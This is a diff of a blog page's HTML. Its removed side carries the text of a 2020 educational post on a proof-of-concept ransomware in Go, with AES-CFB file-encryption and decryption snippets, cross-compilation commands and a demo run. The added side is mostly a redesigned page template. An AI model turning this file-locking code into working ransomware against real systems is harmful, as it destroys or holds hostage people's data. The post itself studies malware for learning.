@@ -1,184 +1,872 @@
 <!DOCTYPE html>
-<html lang="en" dir="auto">
+<html lang="en" dir="ltr" class="scroll-smooth" data-default-appearance="light"
+  data-auto-appearance="false"><head>
+  <meta charset="utf-8" />
+  
+  <meta http-equiv="content-language" content="en" />
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta http-equiv="X-UA-Compatible" content="ie=edge" />
+  
+  <title>Proof of concept of a ransowmare in Go &middot; andpalmier</title>
+  <meta name="title" content="Proof of concept of a ransowmare in Go &middot; andpalmier" />
+  
+  <meta name="description" content="Writing a super simple proof of concept for a ransowmare in Go" />
+  <meta name="keywords" content="malware, go, " />
+  
+  
+  <link rel="canonical" href="https://andpalmier.com/posts/poc-goransom/" />
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  <link type="text/css" rel="stylesheet" href="/css/main.bundle.min.d7978cb46a3d0c138a4aea92e06823e632523aded47c94925f141ffd5627a42e82cd9ef676948197cbed0a5e5077ee3bb59999f85af7a1ac1783c2f1c7835a49.css"
+    integrity="sha512-15eMtGo9DBOKSuqS4Ggj5jJSOt7UfJSSXxQf/VYnpC6CzZ72dpSBl8vtCl5Qd&#43;47tZmZ&#43;Fr3oawXg8Lxx4NaSQ==" />
+  
+  
+  <script type="text/javascript" src="/js/appearance.min.516a16745bea5a9bd011138d254cc0fd3973cd55ce6e15f3dec763e7c7c2c7448f8fe7b54cca811cb821b0c7e12cd161caace1dd794ac3d34d40937cbcc9ee12.js"
+    integrity="sha512-UWoWdFvqWpvQERONJUzA/TlzzVXObhXz3sdj58fCx0SPj&#43;e1TMqBHLghsMfhLNFhyqzh3XlKw9NNQJN8vMnuEg=="></script>
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  <script defer type="text/javascript" id="script-bundle" src="/js/main.bundle.min.700c68ced6ecd1ce7e26bb8477435b70302e309815080ee5975c308b2030021fb2febf06550bed73e27b5c8feac2526b9061f74d46ff72d939dad11fcabc5963.js"
+    integrity="sha512-cAxoztbs0c5&#43;JruEd0NbcDAuMJgVCA7ll1wwiyAwAh&#43;y/r8GVQvtc&#43;J7XI/qwlJrkGH3TUb/ctk52tEfyrxZYw==" data-copy="" data-copied=""></script>
+  
+  
+  
+  <script src="/lib/zoom/zoom.min.37d2094687372da3f7343a221a470f6b8806f7891aa46a5a03966af7f0ebd38b9fe536cb154e6ad28f006d184b294525a7c4054b6bbb4be62d8b453b42db99bd.js" integrity="sha512-N9IJRoc3LaP3NDoiGkcPa4gG94kapGpaA5Zq9/Dr04uf5TbLFU5q0o8AbRhLKUUlp8QFS2u7S&#43;Yti0U7QtuZvQ=="></script>
+  
+  
+  
+  <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png" />
+  <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png" />
+  <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png" />
+  <link rel="manifest" href="/site.webmanifest" />
+  
+  
+  
+  
+  
+  
+  
+  
+  <meta property="og:url" content="https://andpalmier.com/posts/poc-goransom/">
+  <meta property="og:site_name" content="andpalmier">
+  <meta property="og:title" content="Proof of concept of a ransowmare in Go">
+  <meta property="og:description" content="Writing a super simple proof of concept for a ransowmare in Go">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2020-07-29T00:00:00+00:00">
+    <meta property="article:modified_time" content="2020-07-29T00:00:00+00:00">
+    <meta property="article:tag" content="Malware">
+    <meta property="article:tag" content="Go">
+    <meta property="og:image" content="https://andpalmier.com/posts/poc-goransom/featured.jpg">
 
-<head><meta charset="utf-8">
-<meta http-equiv="X-UA-Compatible" content="IE=edge">
-<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
-<meta name="robots" content="index, follow">
-<title>Proof of concept of a ransowmare in Go | andpalmier</title>
-<meta name="keywords" content="malware, go">
-<meta name="description" content="Writing a super simple proof of concept for a ransowmare in Go">
-<meta name="author" content="">
-<link rel="canonical" href="https://andpalmier.com/posts/poc-goransom/">
-<link crossorigin="anonymous" href="/assets/css/stylesheet.347f0a729e38312b74d7f1f92ddd7a482874d53d880ba25e4c1743a3f02201c7.css" integrity="sha256-NH8Kcp44MSt01/H5Ld16SCh01T2IC6JeTBdDo/AiAcc=" rel="preload stylesheet" as="style">
-<link rel="icon" href="https://andpalmier.com/images/favicon-32x32.png">
-<link rel="icon" type="image/png" sizes="16x16" href="https://andpalmier.com/favicon-16x16.png">
-<link rel="icon" type="image/png" sizes="32x32" href="https://andpalmier.com/favicon-32x32.png">
-<link rel="apple-touch-icon" href="https://andpalmier.com/apple-touch-icon.png">
-<link rel="mask-icon" href="https://andpalmier.com/safari-pinned-tab.svg">
-<meta name="theme-color" content="#2e2e33">
-<meta name="msapplication-TileColor" content="#2e2e33">
-<link rel="alternate" hreflang="en" href="https://andpalmier.com/posts/poc-goransom/">
-<noscript>
-    <style>
-        #theme-toggle,
-        .top-link {
-            display: none;
-        }
+  
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:image" content="https://andpalmier.com/posts/poc-goransom/featured.jpg">
+  <meta name="twitter:title" content="Proof of concept of a ransowmare in Go">
+  <meta name="twitter:description" content="Writing a super simple proof of concept for a ransowmare in Go">
 
-    </style>
-</noscript><meta property="og:title" content="Proof of concept of a ransowmare in Go" />
-<meta property="og:description" content="Writing a super simple proof of concept for a ransowmare in Go" />
-<meta property="og:type" content="article" />
-<meta property="og:url" content="https://andpalmier.com/posts/poc-goransom/" />
-<meta property="og:image" content="https://andpalmier.com/papermod-cover.png" />
-<meta property="article:section" content="posts" />
-<meta property="article:published_time" content="2020-07-29T00:00:00+00:00" />
-<meta property="article:modified_time" content="2020-07-29T00:00:00+00:00" />
-
-<meta name="twitter:card" content="summary_large_image" />
-<meta name="twitter:image" content="https://andpalmier.com/papermod-cover.png" />
-<meta name="twitter:title" content="Proof of concept of a ransowmare in Go"/>
-<meta name="twitter:description" content="Writing a super simple proof of concept for a ransowmare in Go"/>
+  
+  <script type="application/ld+json">
+  [{
+    "@context": "https://schema.org",
+    "@type": "Article",
+    "articleSection": "Posts",
+    "name": "Proof of concept of a ransowmare in Go",
+    "headline": "Proof of concept of a ransowmare in Go",
+    
+    "abstract": "Writing a super simple proof of concept for a ransowmare in Go",
+    "inLanguage": "en",
+    "url" : "https:\/\/andpalmier.com\/posts\/poc-goransom\/",
+    "author" : {
+      "@type": "Person",
+      "name": "andpalmier"
+    },
+    "copyrightYear": "2020",
+    "dateCreated": "2020-07-29T00:00:00\u002b00:00",
+    "datePublished": "2020-07-29T00:00:00\u002b00:00",
+    
+    "dateModified": "2020-07-29T00:00:00\u002b00:00",
+    
+    "keywords": ["malware","go"],
+    
+    "mainEntityOfPage": "true",
+    "wordCount": "1478"
+  }]
+  </script>
 
 
-<script type="application/ld+json">
-{
-  "@context": "https://schema.org",
-  "@type": "BreadcrumbList",
-  "itemListElement": [
-    {
-      "@type": "ListItem",
-      "position":  1 ,
-      "name": "Posts",
-      "item": "https://andpalmier.com/posts/"
-    }, 
-    {
-      "@type": "ListItem",
-      "position":  2 ,
-      "name": "Proof of concept of a ransowmare in Go",
-      "item": "https://andpalmier.com/posts/poc-goransom/"
-    }
-  ]
-}
-</script>
-<script type="application/ld+json">
-{
-  "@context": "https://schema.org",
-  "@type": "BlogPosting",
-  "headline": "Proof of concept of a ransowmare in Go",
-  "name": "Proof of concept of a ransowmare in Go",
-  "description": "Writing a super simple proof of concept for a ransowmare in Go",
-  "keywords": [
-    "malware", "go"
-  ],
-  "articleBody": " Introduction This is a blog post about my last project: goransom, which is a proof of concept for a simple ransowmare written in Go. The purpose of the project is purely educative; I wanted to get a bit more familiar with the language and its patterns.\nI am not responsible for the use you make of this tool. Do not use it on systems where you don’t have the permission of the owner.\nBackground Ransomware is a particular type of malware which encrypts the victim’s files and threatens to publish the data or prevent them from accessing the files, unless a ransom is paid. In the last years, ransomware began to represent a serious threat, especially for business. Some of the most famous cases of ransomware attacks are: WannaCry, CryptoLocker and Locky.\nWhile developing an actual ransomware is far from being an easy task, I decided to create a proof of concept with Go to have fun and learn something new.\nGo makes it easy to write malware for different reasons. Firstly, it works nearly everywhere: thanks to cross-compilation, we can write code in Go and use it to obtain an executable for all the most common architectures. Go also has a strong community, with a lot of libraries available. Lastly, it is quite easy to learn and to read, which allows malware programmers to re-engineer the code without too many hassles in case the executable gets detected by anti-viruses.\nTechnical details Being a proof of concept, goransom won’t automatically start to encrypt the full hard drive. We don’t want to cause trouble here.\nInstead, the program allows to specify in input the path of the target file or folder to encrypt. goransom also requires a secret string to be provided, this is going to be used to derive the key for encrypting the files.\nAfter the files are successfully encrypted, they will have a .locked suffix in the filename. In order to get the original files back, the -decrypt flag can be used, specifying the target files we want to decrypt and the secret which was used for the encryption.\nKey generation, encryption and decryption goransom encrypts and decrypts the given files using AES block cipher, specifically with cipher feedback (CFB) mode of operation. Discussing which cipher and mode of operation works better for a ransomware is outside of scope for this post, but it has to be noted that many other options are available in the crypto package and its subdirectories.\nGo makes THIS super easy! Pic from Wikipedia\nSince AES allows three different key lengths: 128, 192 and 256, I decided to go for the 256-bits key, which can be obtained from a sha256 hash of the secret string given in input. Here is how the key derivation function looks like:\n// given a secret returns the sha256 hash // used for encryption/decryption func DeriveKey(secret string)[32]byte{ return sha256.Sum256([]byte(secret)) } The encryption function is called for every file which has to be encrypted; it reads the content of the file and use it as a plaintext for our cipher.\nThe initialization vector (IV) is used by many modes of operation to randomize the encryption and produce different ciphertexts when plaintext and key are the same. The security requirements of the IV are different from the ones of the key: the IV needs to be unique, but it does not need to be a secret. It is therefore quite common to include it at the beginning of the ciphertext.\n// open the given file data, err := ioutil.ReadFile(filePath) if err != nil { panic(err) } // create AES CFB cipher block, err := aes.NewCipher(secretKey) if err != nil { panic(err) } // The IV needs to be unique, but not secure. therefore it's common to // include it at the beginning of the ciphertext. // See here: https://golang.org/pkg/crypto/cipher/ ciphertext := make([]byte, aes.BlockSize+len(data)) iv := ciphertext[:aes.BlockSize] if _, err := io.ReadFull(rand.Reader, iv); err != nil { panic(err) } stream := cipher.NewCFBEncrypter(block, iv) stream.XORKeyStream(ciphertext[aes.BlockSize:], data) // write the ciphertext in the file ioutil.WriteFile(filePath,ciphertext,0644) A \".locked\" suffix is then appended to the filename.\nThe decryption works in a similar way: the content of the locked file is used as a ciphertext. Part of this code is taken directly form the documentation of the crypto/cipher package.\n// open the given file ciphertext, err := ioutil.ReadFile(filePath) if err != nil { panic(err) } // create AES CFB cipher block, err := aes.NewCipher(secretKey) if err != nil { panic(err) } // The IV needs to be unique, but not secure. Therefore it's common to // include it at the beginning of the ciphertext. // See here: https://golang.org/pkg/crypto/cipher/ if len(ciphertext) \u003c aes.BlockSize { panic(\"ciphertext too short\") } iv := ciphertext[:aes.BlockSize] ciphertext = ciphertext[aes.BlockSize:] stream := cipher.NewCFBDecrypter(block, iv) stream.XORKeyStream(ciphertext, ciphertext) // write the plaintext in the file ioutil.WriteFile(filePath,ciphertext,0644) After the decryption, the .locked suffix is removed from the filename, which - if the decryption worked correctly - should now contain the original file.\nCompile for multiple architectures I already mentioned how useful the cross-compilation is, but examples were not provided, so here they are.\nAssuming we have our copy of goransom, if we want to build it for our architecture and OS, it is enough to use:\n$ go build goransom.go $ file goransom goransom: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked A goransom executable will be created, which can be launched as usual. However, if we want to compile the same code for different OSes and architecture, things are not much more complicated.\nHere is how to get a Windows executable on Linux:\n$ GOOS=windows GOARCH=386 go build -o goransom.exe goransom.go $ file goransom.exe goransom.exe: PE32 executable (console) Intel 80386 (stripped to external PDB), for MS Windows and this is the process for MacOS:\n$ GOOS=darwin GOARCH=amd64 go build ransom.go $ file goransom goransom: Mach-O 64-bit x86_64 executable A first run This section provides just an example of how to run goransom on Linux. Assuming we have the following structure:\n$ tree . ├── goransom └── folder └── textfile $ cat folder/textfile THIS IS A SUPER IMPORTANT FILE, PLEASE DONT TAKE IT AWAY FROM ME Now goransom will be used to encrypt all the files in folder using supersecret as a secret:\n$ ./goransom -secret supersecret -target folder Operating on folder Operating on folder/textfile textfile is now encrypted and has been renamed textfile.locked.\n$ tree . ├── goransom └── folder └── textfile.locked $ cat folder/textfile.locked �C4�w��i�G⛘]+�~O(�@f1 �\u003c �0k\u003e\u003c�ZlEV\u0026yj��;)�[1m% Assuming other files were in the folder they would be locked as well, since the entire folder was specified as a target for goransom.\nDecrypting the file is quite easy: just repeat the command for the encryption (same target and same secret) and append the -decrypt command:\n$ ./goransom -secret supersecret -target folder -decrypt Operating on folder Operating on folder/textfile.locked $ tree . ├── goransom └── folder └── textfile $ cat folder/textfile THIS IS A SUPER IMPORTANT FILE, PLEASE DONT TAKE IT AWAY FROM ME It works in the same way in Windows 10\nDetection While I was testing goransom on Windows 10, I had the issue that Windows Security complained about it:\nWindows Security doesn’t like goransom\nSo I uploaded three different goransom executables on VirusTotal, to see if they are detected. Here are the results:\ngoransom for Windows on VirusTotal\ngoransom for Linux on VirusTotal\ngoransom for macOs on VirusTotal\nThe Windows version is the only one which is considered malicious, since 43 (!!) engines flagged it. Please note that the source code which was used to compile the three executables is exactly the same. Also, one of the functions in goransom is called ransomware, which may be the reason why some engines flags the Windows executable.\nUnfortunately goransom cannot be readily tested against public sandboxes, as it requires an input to be executed properly. I am not aware of online tools which allow this level of interaction with an executable, but if you know some, please let me know. It would be interesting to see the outcome.\nConclusion goransom was super fun and relatively easy to make. The crypto package and the goroutines allow the code to be easy to read and efficient.\nThere are a number of improvements which could be added, but, in the end, I consider the proof of concept successful as it is. And the fact that VirusTotal and Microsoft Security do not like goransom makes it even more successful.\nYou can find goransom on my GitHub, let me know if you have suggestions or tips to improve the quality and structure of the code.\nIf you are looking for other proof of concept of ransomware written in Go, check out these projects:\ngo-crypt goransomware go-cry ",
-  "wordCount" : "1448",
-  "inLanguage": "en",
-  "image": "https://andpalmier.com/papermod-cover.png","datePublished": "2020-07-29T00:00:00Z",
-  "dateModified": "2020-07-29T00:00:00Z",
-  "mainEntityOfPage": {
-    "@type": "WebPage",
-    "@id": "https://andpalmier.com/posts/poc-goransom/"
-  },
-  "publisher": {
-    "@type": "Organization",
-    "name": "andpalmier",
-    "logo": {
-      "@type": "ImageObject",
-      "url": "https://andpalmier.com/images/favicon-32x32.png"
-    }
-  }
-}
-</script>
+  
+  
+  <meta name="author" content="andpalmier" />
+  
+  
+  
+  <link href="https://twitter.com/andpalmier" rel="me" />
+  
+  
+  <link href="https://github.com/andpalmier" rel="me" />
+  
+  
+  <link href="https://linkedin.com/in/andpalmier" rel="me" />
+  
+  
+  <link href="https://infosec.exchange/@andpalmier" rel="me" />
+  
+  
+  <link href="https://andpalmier.com/index.xml" rel="me" />
+  
+  
+  
+  
+
+<script src="/lib/jquery/jquery.slim.min.b0dca576e87d7eaa5850ae4e61759c065786cdb6489d68fcc82240539eebd5da522bdb4fda085ffd245808c8fe2acb2516408eb774ef26b5f6015fc6737c0ea8.js" integrity="sha512-sNylduh9fqpYUK5OYXWcBleGzbZInWj8yCJAU57r1dpSK9tP2ghf/SRYCMj&#43;KsslFkCOt3TvJrX2AV/Gc3wOqA=="></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+
+
+
+  
+  
+  <meta name="theme-color"/>
+  
+  
 </head>
+<body
+  class="flex flex-col h-screen px-6 m-auto text-lg leading-7 max-w-7xl bg-neutral text-neutral-900 dark:bg-neutral-800 dark:text-neutral sm:px-14 md:px-24 lg:px-32 scrollbar-thin scrollbar-track-neutral-200 scrollbar-thumb-neutral-400 dark:scrollbar-track-neutral-800 dark:scrollbar-thumb-neutral-600">
+  <div id="the-top" class="absolute flex self-center">
+    <a class="px-3 py-1 text-sm -translate-y-8 rounded-b-lg bg-primary-200 focus:translate-y-0 dark:bg-neutral-600"
+      href="#main-content"><span
+        class="font-bold text-primary-600 ltr:pr-2 rtl:pl-2 dark:text-primary-400">&darr;</span>Skip to main content</a>
+  </div>
+  
+  
+  <div class="min-h-[148px]"></div>
+<div class="fixed inset-x-0 pl-[24px] pr-[24px] bg-neutral dark:bg-neutral-800" style="z-index:100">
+  <div class="relative max-w-[64rem] ml-auto mr-auto">
+    <div style="padding-left:0;padding-right:0;padding-top:2px;padding-bottom:3px"
+    class="main-menu flex items-center justify-between px-4 py-6 sm:px-6 md:justify-start space-x-3">
+    
+    <div class="flex flex-1 items-center justify-between">
+        <nav class="flex space-x-3">
 
-<body class=" dark" id="top">
-<script>
-    if (localStorage.getItem("pref-theme") === "light") {
-        document.body.classList.remove('dark')
-    }
+            
+            <a href="/" class="text-base font-medium text-gray-500 hover:text-gray-900">andpalmier</a>
+            
 
-</script>
+        </nav>
+        <nav class="hidden md:flex items-center space-x-5 md:ml-12 h-12">
 
-<header class="header">
-    <nav class="nav">
-        <div class="logo">
-            <a href="https://andpalmier.com/" accesskey="h" title="andpalmier (Alt + H)">andpalmier</a>
-            <div class="logo-switches">
-                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
-                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
-                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
-                        stroke-linejoin="round">
-                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
-                    </svg>
-                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
-                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
-                        stroke-linejoin="round">
-                        <circle cx="12" cy="12" r="5"></circle>
-                        <line x1="12" y1="1" x2="12" y2="3"></line>
-                        <line x1="12" y1="21" x2="12" y2="23"></line>
-                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
-                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
-                        <line x1="1" y1="12" x2="3" y2="12"></line>
-                        <line x1="21" y1="12" x2="23" y2="12"></line>
-                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
-                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
-                    </svg>
+            
+            
+            
+  <a href="/"  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
+    
+    <p class="text-base font-medium" title="">
+        Home
+    </p>
+</a>
+
+
+
+            
+            
+  <a href="/about/"  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
+    
+    <p class="text-base font-medium" title="">
+        About
+    </p>
+</a>
+
+
+
+            
+            
+
+            
+
+
+            
+
+
+            
+            
+            <div
+                class="ltr:mr-14 rtl:ml-14 flex items-center">
+                <button id="appearance-switcher" aria-label="Dark mode switcher" type="button" class="text-base hover:text-primary-600 dark:hover:text-primary-400">
+                    <div class="flex items-center justify-center dark:hidden">
+                        
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M32 256c0-123.8 100.3-224 223.8-224c11.36 0 29.7 1.668 40.9 3.746c9.616 1.777 11.75 14.63 3.279 19.44C245 86.5 211.2 144.6 211.2 207.8c0 109.7 99.71 193 208.3 172.3c9.561-1.805 16.28 9.324 10.11 16.95C387.9 448.6 324.8 480 255.8 480C132.1 480 32 379.6 32 256z"/></svg>
+
+  </span>
+
+
+                    </div>
+                    <div class="items-center justify-center hidden dark:flex">
+                        
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M256 159.1c-53.02 0-95.1 42.98-95.1 95.1S202.1 351.1 256 351.1s95.1-42.98 95.1-95.1S309 159.1 256 159.1zM509.3 347L446.1 255.1l63.15-91.01c6.332-9.125 1.104-21.74-9.826-23.72l-109-19.7l-19.7-109c-1.975-10.93-14.59-16.16-23.72-9.824L256 65.89L164.1 2.736c-9.125-6.332-21.74-1.107-23.72 9.824L121.6 121.6L12.56 141.3C1.633 143.2-3.596 155.9 2.736 164.1L65.89 256l-63.15 91.01c-6.332 9.125-1.105 21.74 9.824 23.72l109 19.7l19.7 109c1.975 10.93 14.59 16.16 23.72 9.824L256 446.1l91.01 63.15c9.127 6.334 21.75 1.107 23.72-9.822l19.7-109l109-19.7C510.4 368.8 515.6 356.1 509.3 347zM256 383.1c-70.69 0-127.1-57.31-127.1-127.1c0-70.69 57.31-127.1 127.1-127.1s127.1 57.3 127.1 127.1C383.1 326.7 326.7 383.1 256 383.1z"/></svg>
+
+  </span>
+
+
+                    </div>
                 </button>
             </div>
-        </div>
-        <ul id="menu">
-            <li>
-                <a href="https://andpalmier.com/" title="Home">
-                    <span>Home</span>
-                </a>
-            </li>
-            <li>
-                <a href="https://andpalmier.com/about/" title="About">
-                    <span>About</span>
-                </a>
-            </li>
-        </ul>
-    </nav>
-</header>
-<main class="main">
+            
 
-<article class="post-single">
-  <header class="post-header">
+        </nav>
+        <div class="flex md:hidden items-center space-x-5 md:ml-12 h-12">
+
+            <span></span>
+
+            
+
+
+            
+
+            
+            
+            <button id="appearance-switcher-mobile" aria-label="Dark mode switcher" type="button" class="text-base hover:text-primary-600 dark:hover:text-primary-400" style="margin-right:5px">
+                <div class="flex items-center justify-center dark:hidden">
+                    
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M32 256c0-123.8 100.3-224 223.8-224c11.36 0 29.7 1.668 40.9 3.746c9.616 1.777 11.75 14.63 3.279 19.44C245 86.5 211.2 144.6 211.2 207.8c0 109.7 99.71 193 208.3 172.3c9.561-1.805 16.28 9.324 10.11 16.95C387.9 448.6 324.8 480 255.8 480C132.1 480 32 379.6 32 256z"/></svg>
+
+  </span>
+
+
+                </div>
+                <div class="items-center justify-center hidden dark:flex">
+                    
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M256 159.1c-53.02 0-95.1 42.98-95.1 95.1S202.1 351.1 256 351.1s95.1-42.98 95.1-95.1S309 159.1 256 159.1zM509.3 347L446.1 255.1l63.15-91.01c6.332-9.125 1.104-21.74-9.826-23.72l-109-19.7l-19.7-109c-1.975-10.93-14.59-16.16-23.72-9.824L256 65.89L164.1 2.736c-9.125-6.332-21.74-1.107-23.72 9.824L121.6 121.6L12.56 141.3C1.633 143.2-3.596 155.9 2.736 164.1L65.89 256l-63.15 91.01c-6.332 9.125-1.105 21.74 9.824 23.72l109 19.7l19.7 109c1.975 10.93 14.59 16.16 23.72 9.824L256 446.1l91.01 63.15c9.127 6.334 21.75 1.107 23.72-9.822l19.7-109l109-19.7C510.4 368.8 515.6 356.1 509.3 347zM256 383.1c-70.69 0-127.1-57.31-127.1-127.1c0-70.69 57.31-127.1 127.1-127.1s127.1 57.3 127.1 127.1C383.1 326.7 326.7 383.1 256 383.1z"/></svg>
+
+  </span>
+
+
+                </div>
+            </button>
+            
+
+        </div>
+    </div>
+    <div class="-my-2 -mr-2 md:hidden">
+
+        <label id="menu-button" class="block">
+            
+            <div class="cursor-pointer hover:text-primary-600 dark:hover:text-primary-400">
+                
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path fill="currentColor" d="M0 96C0 78.33 14.33 64 32 64H416C433.7 64 448 78.33 448 96C448 113.7 433.7 128 416 128H32C14.33 128 0 113.7 0 96zM0 256C0 238.3 14.33 224 32 224H416C433.7 224 448 238.3 448 256C448 273.7 433.7 288 416 288H32C14.33 288 0 273.7 0 256zM416 448H32C14.33 448 0 433.7 0 416C0 398.3 14.33 384 32 384H416C433.7 384 448 398.3 448 416C448 433.7 433.7 448 416 448z"/></svg>
+
+  </span>
+
+
+            </div>
+            <div id="menu-wrapper" style="padding-top:5px;"
+                class="fixed inset-0 z-30 invisible w-screen h-screen m-0 overflow-auto transition-opacity opacity-0 cursor-default bg-neutral-100/50 backdrop-blur-sm dark:bg-neutral-900/50">
+                <ul
+                    class="flex space-y-2 mt-3 flex-col items-end w-full px-6 py-6 mx-auto overflow-visible list-none ltr:text-right rtl:text-left max-w-7xl">
+
+                    <li id="menu-close-button">
+                        <span
+                            class="cursor-pointer inline-block align-text-bottom hover:text-primary-600 dark:hover:text-primary-400">
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 320 512"><path fill="currentColor" d="M310.6 361.4c12.5 12.5 12.5 32.75 0 45.25C304.4 412.9 296.2 416 288 416s-16.38-3.125-22.62-9.375L160 301.3L54.63 406.6C48.38 412.9 40.19 416 32 416S15.63 412.9 9.375 406.6c-12.5-12.5-12.5-32.75 0-45.25l105.4-105.4L9.375 150.6c-12.5-12.5-12.5-32.75 0-45.25s32.75-12.5 45.25 0L160 210.8l105.4-105.4c12.5-12.5 32.75-12.5 45.25 0s12.5 32.75 0 45.25l-105.4 105.4L310.6 361.4z"/></svg>
+
+  </span>
+
+</span>
+                    </li>
+
+                    
+
+                    
+  <li class="mt-1">
+    <a href="/"  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
+        
+        <p class="text-bg font-bg" title="">
+            Home
+        </p>
+    </a>
+</li>
+
+
+
+
+                    
+
+                    
+  <li class="mt-1">
+    <a href="/about/"  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
+        
+        <p class="text-bg font-bg" title="">
+            About
+        </p>
+    </a>
+</li>
+
+
+
+
+                    
+
+                </ul>
+                
+                
+
+            </div>
+        </label>
+    </div>
+</div>
+
+
+
+
+<script>
+    (function () {
+        var $mainmenu = $('.main-menu');
+        var path = window.location.pathname;
+        $mainmenu.find('a[href="' + path + '"]').each(function (i, e) {
+            $(e).children('p').addClass('active');
+        });
+    })();
+</script>
+
+
+  </div>
+</div>
+
+  
+  <div class="relative flex flex-col grow">
+    <main id="main-content" class="grow">
+      
+
+
+<article>
+  
+  
+  
+  
+  
+  
+        
+            <div class="w-full h-36 md:h-56 lg:h-72 single_hero_basic nozoom" style="background-image:url(/posts/poc-goransom/featured_hu226538042838018951.jpg);"></div>
+        
     
-    <h1 class="post-title entry-hint-parent">
+  
+  
+
+  <header id="single_header" class="mt-5 max-w-prose">
+    
+    <h1 class="mt-0 text-4xl font-extrabold text-neutral-900 dark:text-neutral">
       Proof of concept of a ransowmare in Go
     </h1>
-    <div class="post-meta"><span title='2020-07-29 00:00:00 +0000 UTC'>July 29, 2020</span>&nbsp;·&nbsp;7 min
+    <div class="mt-1 mb-6 text-base text-neutral-500 dark:text-neutral-400 print:hidden">
+      
+
+
+
+
+
+  
+  
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+<div class="flex flex-row flex-wrap items-center">
+  
+  
+  <time datetime="2020-07-29T00:00:00&#43;00:00">29 July 2020</time><span class="px-2 text-primary-500">&middot;</span><span title="Reading time">7 mins</span>
+  
+
+  
+  
+</div>
+
+
+
+
+
+
+
+
+    </div>
+
+    
+    
+    
+    
+    
+
+    
+
+    
+      
+      
+        
+        
+<div class="flex author">
+  
+    
+    
+      
+    
+    
+      
+        
+      
+      <img class="!mt-0 !mb-0 h-24 w-24 rounded-full ltr:mr-4 rtl:ml-4" width="96" height="96"
+      alt="andpalmier" src="/img/img_hu7190303453371646243.jpeg" />
+    
+  
+  <div class="place-self-center">
+    
+    <div class="text-[0.6rem] uppercase leading-3 text-neutral-500 dark:text-neutral-400">
+      Author
+    </div>
+    <div class="font-semibold leading-6 text-neutral-800 dark:text-neutral-300">
+      andpalmier
+    </div>
+    
+    
+    <div class="text-sm text-neutral-700 dark:text-neutral-400">cyber threat researcher, eternal noob, As Roma fan</div>
+    
+    <div class="text-2xl sm:text-lg">
+  <div class="flex flex-wrap text-neutral-400 dark:text-neutral-500">
+    
+      
+        <a
+          class="px-1 hover:text-primary-700 dark:hover:text-primary-400"
+          href="https://twitter.com/andpalmier"
+          target="_blank"
+          aria-label="Twitter"
+          rel="me noopener noreferrer"
+          ><span class="inline-block align-text-bottom">
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M459.37 151.716c.325 4.548.325 9.097.325 13.645 0 138.72-105.583 298.558-298.558 298.558-59.452 0-114.68-17.219-161.137-47.106 8.447.974 16.568 1.299 25.34 1.299 49.055 0 94.213-16.568 130.274-44.832-46.132-.975-84.792-31.188-98.112-72.772 6.498.974 12.995 1.624 19.818 1.624 9.421 0 18.843-1.3 27.614-3.573-48.081-9.747-84.143-51.98-84.143-102.985v-1.299c13.969 7.797 30.214 12.67 47.431 13.319-28.264-18.843-46.781-51.005-46.781-87.391 0-19.492 5.197-37.36 14.294-52.954 51.655 63.675 129.3 105.258 216.365 109.807-1.624-7.797-2.599-15.918-2.599-24.04 0-57.828 46.782-104.934 104.934-104.934 30.213 0 57.502 12.67 76.67 33.137 23.715-4.548 46.456-13.32 66.599-25.34-7.798 24.366-24.366 44.833-46.132 57.827 21.117-2.273 41.584-8.122 60.426-16.243-14.292 20.791-32.161 39.308-52.628 54.253z"/></svg>
+
+  </span>
+
+</span></a
+        >
+      
+    
+      
+        <a
+          class="px-1 hover:text-primary-700 dark:hover:text-primary-400"
+          href="https://github.com/andpalmier"
+          target="_blank"
+          aria-label="Github"
+          rel="me noopener noreferrer"
+          ><span class="inline-block align-text-bottom">
+
+  <span class="relative block icon">
